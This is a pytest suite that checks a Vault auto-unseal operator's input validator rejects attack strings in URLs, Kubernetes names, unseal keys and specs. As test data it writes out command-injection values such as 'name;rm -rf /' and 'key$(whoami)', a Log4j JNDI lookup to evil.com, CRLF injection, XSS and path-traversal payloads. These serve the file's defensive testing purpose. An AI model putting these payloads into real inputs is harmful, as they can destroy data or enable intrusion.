import base64

import pytest

from vault_autounseal_operator.security import SecurityValidator


class TestSecurityEdgeCases:
    """Comprehensive security tests for edge cases and attack vectors"""

    def test_url_validation_edge_cases(self):
        """Test URL validation against various attack vectors"""

        # Valid edge cases
        valid_urls = [
            "https://vault-123.example-corp.com:8200",
            "http://10.0.0.1:8200",
            "https://vault.example.com:8200/v1/sys",
            "https://[::1]:8200",  # IPv6
        ]

        for url in valid_urls:
            try:
                result = SecurityValidator.validate_url(url)
                assert result  # Should not raise exception
            except ValueError:
                pytest.fail(f"Valid URL rejected: {url}")

        # Attack vectors
        malicious_urls = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "file:///etc/passwd",
            "ftp://evil.com/malware",
            "ldap://evil.com/inject",
            "https://vault.example.com/../../../etc/passwd",
            "https://vault.example.com:8200?../../../etc/passwd",
            "https://vault.example.com#../../../etc/passwd",
            "https://admin:password@vault.example.com:8200",  # Credentials in URL
            "https://vault.example.com:999999",  # Invalid port
            "https://" + "a" * 2048,  # Oversized hostname
            "https://vault.example.com\r\nHost: evil.com",  # CRLF injection
            "https://vault.example.com\x00.evil.com",  # Null byte
        ]

        for url in malicious_urls:
            with pytest.raises(ValueError):
                SecurityValidator.validate_url(url)

    def test_kubernetes_name_injection_attacks(self):
        """Test Kubernetes resource name validation against injection"""

        # Path traversal attempts
        malicious_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "..",
            ".",
            "/etc/passwd",
            "\\system32",
            "name\x00evil",  # Null byte
            "name\r\nevil",  # CRLF
            "name\nevil",  # Newline
            "name;rm -rf /",  # Command injection
            "name`rm -rf /`",  # Command injection
            "name$(rm -rf /)",  # Command injection
            "name' OR '1'='1",  # SQL-like injection
            "<script>alert(1)</script>",  # XSS
            "&lt;script&gt;alert(1)&lt;/script&gt;",  # Encoded XSS
            "name" + "a" * 300,  # Oversized
            "",  # Empty
            " ",  # Whitespace only
            "UPPERCASE",  # Should be converted to lowercase
            "invalid_underscore",  # Invalid character
            "invalid-",  # Ends with hyphen
            "-invalid",  # Starts with hyphen
            "123invalid",  # Starts with number (invalid for some contexts)
        ]

        for name in malicious_names:
            with pytest.raises(ValueError):
                SecurityValidator.validate_kubernetes_name(name)

    def test_base64_key_validation_attacks(self):
        """Test base64 key validation against various attacks"""

        # Valid base64 keys
        valid_keys = [
            base64.b64encode(b"valid-key-123").decode(),
            base64.b64encode(b"another-valid-key!@#$%").decode(),
            base64.b64encode(b"x" * 100).decode(),  # Long but valid
        ]

        for key in valid_keys:
            try:
                SecurityValidator.validate_unseal_keys([key])
            except ValueError:
                pytest.fail(f"Valid key rejected: {key}")

        # Malicious base64 attempts
        malicious_keys = [
            "not-base64-at-all!",
            "dGVzdA===",  # Invalid padding
            "dGVzdA",  # Missing padding
            "dGVz dA==",  # Spaces in base64
            "dGVzdA==\n\r",  # With newlines
            "dGVzdA==; rm -rf /",  # Command injection attempt
            base64.b64encode(b"").decode(),  # Empty when decoded
            "A" * 2000,  # Oversized
            "\x00\x01\x02",  # Binary data
            "../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}",  # Log4j-style injection
        ]

        for key in malicious_keys:
            with pytest.raises(ValueError):
                SecurityValidator.validate_unseal_keys([key])

    def test_threshold_manipulation_attacks(self):
        """Test threshold validation against manipulation"""

        # Valid thresholds
        valid_cases = [(1, 1), (1, 5), (3, 5), (5, 5)]

        for threshold, num_keys in valid_cases:
            result = SecurityValidator.validate_threshold(threshold, num_keys)
            assert result == threshold

        # Attack vectors
        malicious_cases = [
            (-1, 5),  # Negative
            (0, 5),  # Zero
            (6, 5),  # Exceeds keys
            (999, 5),  # Extremely high
            (2**31, 5),  # Integer overflow attempt
            (-(2**31), 5),  # Integer underflow
        ]

        for threshold, num_keys in malicious_cases:
            with pytest.raises(ValueError):
                SecurityValidator.validate_threshold(threshold, num_keys)

    def test_secret_key_validation_injection(self):
        """Test secret key validation against injection attacks"""

        valid_keys = [
            "valid-key",
            "valid.key",
            "valid_key",
            "validkey123",
            "VALID-KEY",
            "a",  # Single character
            "a" * 200,  # Long but valid
        ]

        for key in valid_keys:
            result = SecurityValidator.validate_secret_key(key)
            assert result == key

        malicious_keys = [
            "key with spaces",
            "key\twith\ttabs",
            "key\nwith\nnewlines",
            "key;rm -rf /",
            "key`echo hack`",
            "key$(whoami)",
            "key'OR'1'='1",
            "key<script>alert(1)</script>",
            "../../../etc/passwd",
            "key\x00null",
            "key\r\ncrlf",
            "",  # Empty
            " ",  # Whitespace
            "a" * 300,  # Too long
        ]

        for key in malicious_keys:
            with pytest.raises(ValueError):
                SecurityValidator.validate_secret_key(key)

    def test_spec_validation_complex_attacks(self):
        """Test complete spec validation against complex attack combinations"""

        # Prototype pollution attempt
        prototype_pollution_spec = {
            "url": "https://vault.example.com:8200",
            "unsealKeys": {"secret": ["dGVzdA=="]},
            "__proto__": {"isAdmin": True},
            "constructor": {"prototype": {"isAdmin": True}},
        }

        # Should not raise exception for unknown fields (just ignore them)
        try:
            result = SecurityValidator.validate_spec(prototype_pollution_spec)
            # Should only contain expected fields
            assert "__proto__" not in result
            assert "constructor" not in result
        except ValueError:
            pass  # May reject due to other validation

        # Nested injection attempt
        nested_injection_spec = {
            "url": "https://vault.example.com:8200",
            "unsealKeys": {
                "secretRef": {
                    "name": "valid-name",
                    "namespace": "../../../etc/passwd",
                    "key": "unseal-keys; rm -rf /",
                }
            },
        }

        with pytest.raises(ValueError):
            SecurityValidator.validate_spec(nested_injection_spec)

        # Type confusion attempt
        type_confusion_specs = [
            # String where object expected
            {"url": "https://vault.example.com:8200", "unsealKeys": "not-an-object"},
            # Array where string expected
            {
                "url": ["https://vault.example.com:8200"],
                "unsealKeys": {"secret": ["dGVzdA=="]},
            },
            # Number where string expected
            {"url": 123, "unsealKeys": {"secret": ["dGVzdA=="]}},
            # Object where array expected
            {
                "url": "https://vault.example.com:8200",
                "unsealKeys": {"secret": {"not": "array"}},
            },
        ]

        for spec in type_confusion_specs:
            with pytest.raises((ValueError, TypeError, AttributeError)):
                SecurityValidator.validate_spec(spec)

    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks"""

        # Too many unseal keys
        too_many_keys = [
            base64.b64encode(f"key{i}".encode()).decode() for i in range(20)
        ]
        with pytest.raises(ValueError, match="Too many unseal keys"):
            SecurityValidator.validate_unseal_keys(too_many_keys)

        # Extremely long strings
        oversized_specs = [
            {"url": "https://" + "a" * 3000, "unsealKeys": {"secret": ["dGVzdA=="]}},
            {
                "url": "https://vault.example.com:8200",
                "unsealKeys": {"secret": [base64.b64encode(b"a" * 2000).decode()]},
            },
            {
                "url": "https://vault.example.com:8200",
                "unsealKeys": {"secretRef": {"name": "a" * 300, "key": "keys"}},
            },
        ]

        for spec in oversized_specs:
            with pytest.raises(ValueError):
                SecurityValidator.validate_spec(spec)

    def test_log_injection_prevention(self):
        """Test comprehensive log injection prevention"""

        # Various log injection payloads
        injection_payloads = [
            "normal\n[ERROR] Fake error message",
            "normal\r\n[WARN] System compromised",
            "normal\n\n[INFO] Admin password: admin123",
            "normal\x00[CRITICAL] Null byte injection",
            "normal\t[DEBUG] Tab injection",
            "normal\x1b[31m[ALERT] ANSI escape codes\x1b[0m",
            "normal\u0000[UNICODE] Unicode null",
            "normal\u2028[LINE_SEP] Line separator injection",
            "normal\u2029[PARA_SEP] Paragraph separator injection",
        ]

        for payload in injection_payloads:
            test_data = {
                "sensitive_key": payload,
                "normal_field": "safe data",
                "nested": {"password": payload, "token": payload},
            }

            sanitized = SecurityValidator.sanitize_log_data(test_data)

            # Sensitive fields should be redacted
            assert sanitized["sensitive_key"] == "[REDACTED]"
            assert sanitized["nested"]["password"] == "[REDACTED]"
            assert sanitized["nested"]["token"] == "[REDACTED]"

            # Normal fields should be preserved
            assert sanitized["normal_field"] == "safe data"

    def test_unicode_normalization_attacks(self):
        """Test against Unicode normalization attacks"""

        # Unicode normalization attack vectors
        unicode_attacks = [
            "völid-näme",  # Non-ASCII characters
            "val‍id",  # Zero-width joiner
            "val​id",  # Zero-width space
            "valid\u200b",  # Zero-width space at end
            "\u200bvalid",  # Zero-width space at start
            "val\u00adid",  # Soft hyphen
            "valid\u034f",  # Combining grapheme joiner
            "ｖａｌｉｄ",  # Fullwidth characters
            "𝒗𝒂𝒍𝒊𝒅",  # Mathematical script
        ]

        for attack in unicode_attacks:
            with pytest.raises(ValueError):
                SecurityValidator.validate_kubernetes_name(attack)

    def test_regex_dos_protection(self):
        """Test protection against regex DoS attacks"""

        # Patterns that could cause catastrophic backtracking
        regex_dos_patterns = [
            "a" * 1000 + "!",  # Long string with invalid char at end
            "valid-name-" * 100,  # Repetitive pattern
            "v" * 500 + "alid" * 500,  # Mixed repetition
        ]

        for pattern in regex_dos_patterns:
            # Should either validate quickly or reject quickly, not hang
            import time

            start = time.time()
            try:
                SecurityValidator.validate_kubernetes_name(pattern)
            except ValueError:
                pass  # Expected for invalid patterns
            end = time.time()

            # Should not take more than 1 second (generous timeout)
            assert (
                end - start < 1.0
            ), f"Regex took too long for pattern: {pattern[:50]}..."
